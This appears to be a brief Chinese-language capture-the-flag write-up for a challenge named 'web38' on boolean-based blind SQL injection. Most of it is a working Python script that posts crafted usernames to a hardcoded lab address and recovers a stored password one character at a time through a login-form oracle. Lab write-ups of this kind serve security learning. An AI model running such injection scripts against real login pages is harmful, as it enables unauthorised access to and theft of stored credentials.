# web38

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618662156628-1113547220043.png)

题目描述
> **基于布尔的sql盲注**

emmmm
![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618662172826-2086648225798.png)

直接扔脚本吧
```python
  1 import requests
  2
  3 url = 'http://114.67.246.176:18706'
  4
  5
  6 def asscii_list():
  7     str_list = []
  8     for i in range(32, 127):
  9         str_list.append(chr(i))
 10     return str_list
 11
 12
 13 def flag():
 14     str_list = asscii_list()
 15     a = ''
 16     for i in range(1, 50):
 17         for j in str_list:
 18             payload = "admin'^(ascii(mid((password)from(%s)))<>%s)#" % (i,
 19                                                                         ord(j))
 20             data = {"username": payload, "password": 'admin'}
 21             res = requests.post(url, data=data)
 22             if 'password error' in res.text:
 23                 a += j
 24                 print("获取一个%s" % j)
 25                 break
 26         if len(a) >= 32:
 27            break
 28     print("flag:%s" % a)
 29
 30
 31 flag()
```
